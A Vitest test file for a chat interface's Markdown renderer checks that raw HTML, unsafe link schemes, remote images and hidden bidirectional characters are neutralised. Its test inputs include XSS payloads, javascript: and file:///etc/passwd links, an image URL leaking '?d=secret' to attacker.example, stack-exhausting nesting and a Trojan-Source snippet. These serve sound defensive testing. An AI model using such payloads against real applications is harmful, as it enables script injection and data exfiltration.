import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { MessageContent, PLAIN_TEXT_NOTE, renderMarkdown } from '../src/MessageContent.tsx'
import { ErrorBoundary } from '../src/components/ErrorBoundary.tsx'
import { exceedsMarkdownNesting, MAX_LINE_CONTAINERS, MAX_OPEN_DELIMITERS, MAX_TREE_DEPTH } from '../src/markdownNesting.ts'

function render(text: string, streaming = false) {
  return renderToStaticMarkup(createElement(MessageContent, { text, streaming }))
}

describe('message markdown', () => {
  it('renders common text structures and GFM without preserving layout whitespace', () => {
    const html = render(
      '# 标题\n\n正文 **重点**，`inline()`。\n\n> 一段引用\n\n1. 第一步\n2. 第二步\n\n- [x] 完成\n- [ ] 待办\n\n~~旧内容~~\n\n| 名称 | 结果 |\n| --- | --- |\n| 工具 | 正常 |',
    )
    expect(html).toContain('<h1>标题</h1>')
    expect(html).toContain('<strong>重点</strong>')
    expect(html).toContain('<code>inline()</code>')
    expect(html).toContain('<blockquote>')
    expect(html).toContain('<ol>')
    expect(html).toContain('type="checkbox" disabled="" checked=""')
    expect(html).toContain('<del>旧内容</del>')
    expect(html).toContain('class="message-table-scroll" tabindex="0" role="region"')
    expect(html).toContain('<th>名称</th>')
    expect(html).not.toContain('<pre>')
  })

  it('ignores raw HTML and never turns HTML source inside code into active elements', () => {
    const html = render(
      '正文\n\n<script>alert(1)</script>\n\n<img src="x" onerror="alert(2)">\n\n<iframe src="https://example.com"></iframe>\n\n```html\n<button onclick="alert(3)">click</button>\n```',
    )
    expect(html).not.toMatch(/<(script|img|iframe|button onclick)/i)
    expect(html).not.toContain('onerror=')
    expect(html).toContain('&lt;button onclick=&quot;alert(3)&quot;&gt;click&lt;/button&gt;')
  })

  it.each([
    'javascript:alert%281%29',
    'JaVaScRiPt:alert%281%29',
    'jav&#x61;script:alert%281%29',
    'vbscript:msgbox%281%29',
    'data:text/html;base64,PHNjcmlwdD4=',
    'file:///etc/passwd',
    'irc://example.com',
    'xmpp:example.com',
    '//example.com/path',
  ])('does not create a navigable link for %s', url => {
    const html = render(`[bad](${url})`)
    expect(html).not.toContain('href=')
    expect(html).toContain('bad')
  })

  it('keeps Markdown-escaped backslashes as path characters in a chip, never a network path or a link', () => {
    const html = render('[local](\\\\example.com/path)')
    expect(html).not.toContain('href=')
    expect(html).toContain('data-file-chip=""')
  })

  it('links only web and mail addresses, isolating external navigation; file references become chips', () => {
    const html = render(
      '[web](https://example.com/a?q=1) [mail](mailto:team@example.com) [local](/link/help) [relative](./report.md) [anchor](#result)',
    )
    expect(html).toContain('href="https://example.com/a?q=1" target="_blank" rel="noopener noreferrer"')
    expect(html).toContain('<a href="mailto:team@example.com">mail</a>')
    expect(html.match(/href=/g)).toHaveLength(2)
    expect(html.match(/data-file-chip=""/g)).toHaveLength(2)
    expect(html).toContain('aria-label="/link/help"')
    expect(html).toContain('aria-label="./report.md"')
    // A fragment the model wrote is not a footnote of this reply: it stays text.
    expect(html).toContain('<span>anchor</span>')
  })

  it('never loads images: a web image becomes a link the reader opens, a file a chip, others only their alt text', () => {
    const html = render(
      '![diagram](https://attacker.example/p?d=secret) ![local](/link/api/snapshot) ![unsafe](data:image/svg+xml;base64,PHN2Zz4=) ![](mailto:team@example.com)',
    )
    expect(html).not.toContain('<img')
    expect(html).toContain(
      '<a class="message-image" href="https://attacker.example/p?d=secret" target="_blank" rel="noopener noreferrer">外部图片：diagram</a>',
    )
    expect(html).toContain('aria-label="图片「local」：/link/api/snapshot"')
    expect(html).toContain('<span class="file-chip-prefix">图片</span>')
    expect(html).toContain('<span class="message-image">图片：unsafe</span>')
    expect(html).toContain('<span class="message-image">图片：图片</span>')
    expect(html).not.toContain('data:image')
  })

  it('keeps a code block readable before and after the streaming fence closes', () => {
    const partial = '说明\n\n```ts\nconst answer = 42\nconsole.log(answer)'
    const streaming = render(partial, true)
    const finished = render(`${partial}\n\`\`\``)
    for (const html of [streaming, finished]) {
      expect(html.match(/class="message-code(?: is-open)?"/g)).toHaveLength(1)
      expect(html).toContain('class="message-code-language">ts</span>')
      expect(html).toContain('<code>const answer = 42\nconsole.log(answer)')
      expect(html).toContain('aria-label="复制代码"')
      expect(html).not.toContain('```')
    }
    expect(streaming).toContain('aria-busy="true"')
    expect(finished).not.toContain('aria-busy=')
  })

  it('shows the newest lines of a long block still arriving, and every byte once it closes', () => {
    const lines = Array.from({ length: 40 }, (_, i) => `line ${i + 1}`).join('\n')
    const open = render(`\`\`\`text\n${lines}`, true)
    expect(open).toContain('message-code is-collapsed is-open is-tail')
    expect(open).toContain('前 23 行已收起')
    expect(open).toContain('<code>line 24\n')
    expect(open).toContain('line 40</code>')
    expect(open).not.toContain('line 23\n')
    expect(open).toContain('展开全部 40 行')
    const closed = render(`\`\`\`text\n${lines}\n\`\`\`\n`, true)
    expect(closed).toContain('class="message-code is-collapsed"')
    expect(closed).not.toContain('已收起')
    expect(closed).toContain('<code>line 1\n')
    expect(closed).toContain('line 40\n</code>')
  })

  it('does not take a fence with text after it for the closing one', () => {
    expect(render('```ts\nconst a = 1\n```x\nconst b = 2', true)).toContain('is-open')
    expect(render('```ts\nconst a = 1\n```  \n', true)).not.toContain('is-open')
  })

  it('sees the closing fence of a block inside a list item or a quote', () => {
    expect(render('10. step\n\n    ```ts\n    const a = 1\n    ```\n', true)).not.toContain('is-open')
    expect(render('> ```ts\n> const a = 1\n> ```\n', true)).not.toContain('is-open')
    expect(render('- > ```ts\n  > const a = 1\n  > ```\n', true)).not.toContain('is-open')
    expect(render('10. step\n\n    ```ts\n    const a = 1\n', true)).toContain('is-open')
    expect(render('> ```ts\n> const a = 1\n', true)).toContain('is-open')
    // Indented past a fence's reach, this line is the block's text.
    expect(render('```ts\n    ```\nconst a = 1\n', true)).toContain('is-open')
  })

  it('retains all code in long blocks while offering an accessible expansion control', () => {
    const lines = Array.from({ length: 28 }, (_, i) => `line ${i + 1}`).join('\n')
    const html = render(`\`\`\`text\n${lines}\n\`\`\``)
    expect(html).toContain('message-code is-collapsed')
    expect(html).toContain('aria-expanded="false"')
    expect(html).toContain('展开全部 28 行')
    expect(html).toContain('line 28\n</code>')
    expect(html).toContain('tabindex="0" aria-label="text 代码"')
  })

  it.each([
    ['blockquotes', '>'.repeat(5000) + ' a'],
    ['nested lists', '- '.repeat(3000) + 'a'],
    ['ordered lists', '1. '.repeat(3000) + 'a'],
    ['indented lists', Array.from({ length: 400 }, (_, index) => ' '.repeat(index * 2) + '- a').join('\n')],
    ['emphasis', '*'.repeat(6000) + 'a' + '*'.repeat(6000)],
    [
      'mixed emphasis',
      Array.from({ length: 3000 }, (_, index) => (index % 2 ? '*a ' : '_a ')).join('')
        + 'x'
        + Array.from({ length: 3000 }, (_, index) => (index % 2 ? ' a_' : ' a*')).join(''),
    ],
    [
      'emphasis that survives the first check',
      Array.from({ length: 300 }, (_, index) => (index % 2 ? '*a ' : '_a ')).join('')
        + 'x'
        + Array.from({ length: 300 }, (_, index) => (index % 2 ? ' a_' : ' a*')).join(''),
    ],
    ['lists that survive the first check', '- '.repeat(MAX_LINE_CONTAINERS) + 'a'],
  ])('shows deeply nested %s as plain text instead of overflowing the stack', (_name, text) => {
    const html = render(text, true)
    expect(html).toContain(`<p class="message-plain-note">${PLAIN_TEXT_NOTE}</p><pre class="message-plain">`)
    expect(html).not.toMatch(/<(blockquote|ul|ol|em|strong)>/)
  })

  it('keeps ordinary nesting, long replies and code-heavy text as Markdown', () => {
    const quote = render('> > > 三层引用\n\n- a\n  - b\n    - c *d **e***')
    expect(quote.match(/<blockquote>/g)).toHaveLength(3)
    expect(quote).toContain('<strong>e</strong>')
    expect(quote).not.toContain('message-plain')
    const code = '```c\n' + Array.from({ length: 400 }, (_, i) => `char* p${i} = *q${i}; int **r = a*b;`).join('\n') + '\n```'
    expect(exceedsMarkdownNesting(code)).toBe(false)
    expect(render(code)).toContain('class="message-code is-collapsed"')
    const long = Array.from({ length: 200 }, () => '**粗体** 和 *斜体* 与 ~~删除~~').join('\n')
    expect(render(long)).toContain('<strong>粗体</strong>')
  })

  it('checks the parsed depth after the cheap estimate and fails closed when the pipeline throws', () => {
    expect(MAX_TREE_DEPTH).toBeLessThan(MAX_LINE_CONTAINERS * 2)
    expect(exceedsMarkdownNesting('*'.repeat(MAX_OPEN_DELIMITERS + 1) + 'a' + '*'.repeat(MAX_OPEN_DELIMITERS + 1))).toBe(true)
    expect(renderMarkdown({ children: '>'.repeat(MAX_TREE_DEPTH + 1) + ' a' })).toBeNull()
    expect(
      renderMarkdown({
        children: 'x',
        remarkPlugins: [
          () => () => {
            throw new Error('plugin failed')
          },
        ],
      }),
    ).toBeNull()
    expect(renderMarkdown({ children: '> a' })).not.toBeNull()
  })

  it('marks hidden and direction-changing characters in code blocks while copy keeps the original', () => {
    const html = render('```js\nif (role != "user\u202E \u2066// admin\u2069 \u2066") grant()\u200B\n```')
    expect(html).toContain('class="message-code-hidden"')
    expect(html).toContain('<span class="hidden-char" title="不可见或改变显示方向的字符 U+202E">\\u{202E}</span>')
    expect(html).toContain('\\u{2066}')
    expect(html).toContain('\\u{200B}')
    expect(html).not.toMatch(/[\u202E\u2066\u2069\u200B]/)
  })

  it('falls back to plain text when rendering a message throws, and retries with the next text', () => {
    const boundary = new ErrorBoundary({ resetKey: 'a', fallback: 'plain', children: 'markdown' })
    boundary.state = { ...boundary.state, ...ErrorBoundary.getDerivedStateFromError() }
    expect(boundary.render()).toBe('plain')
    expect(ErrorBoundary.getDerivedStateFromProps({ resetKey: 'a', fallback: 'plain', children: 'markdown' }, boundary.state)).toBeNull()
    expect(ErrorBoundary.getDerivedStateFromProps({ resetKey: 'ab', fallback: 'plain', children: 'markdown' }, boundary.state)).toEqual({
      failed: false,
      resetKey: 'ab',
    })
  })

  it('gives footnotes unique ids across messages and retains their local links', () => {
    const html = renderToStaticMarkup(
      createElement(
        'div',
        null,
        createElement(MessageContent, { text: '第一条[^1]\n\n[^1]: 解释一' }),
        createElement(MessageContent, { text: '第二条[^1]\n\n[^1]: 解释二' }),
      ),
    )
    const noteIds = [...html.matchAll(/id="([^"]+-fn-1)"/g)].map(match => match[1])
    expect(noteIds).toHaveLength(2)
    for (const id of noteIds) expect(html).toContain(`href="#${id}"`)
    const allIds = [...html.matchAll(/id="([^"]+)"/g)].map(match => match[1])
    expect(new Set(allIds).size).toBe(allIds.length)
    for (const match of html.matchAll(/aria-describedby="([^"]+)"/g)) expect(allIds).toContain(match[1])
  })
})
